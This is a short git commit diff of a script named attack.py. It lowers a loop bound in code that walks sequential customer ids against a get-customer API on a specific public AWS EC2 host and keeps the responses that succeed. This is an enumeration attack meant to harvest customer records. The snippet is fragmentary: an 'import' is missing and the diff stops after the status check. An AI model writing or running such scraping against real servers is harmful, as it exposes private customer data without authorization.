d401faeba83e11117db26cb386fe8177c097e36d
Purva_Gamer <72387422+Purva3047@users.noreply.github.com>
2023-02-04 14:29:12 +0000

    Update attack.py

--- attack.py
+++ attack.py
@@ -1,6 +1,6 @@
 requests
 
-for i in range(1, 6969):
+for i in range(1, 5000):
     URL = f"http://ec2-3-111-8-121.ap-south-1.compute.amazonaws.com/api/get-customer?id={i}"
     r = requests.get(url=URL)
     if r.status_code == 200:
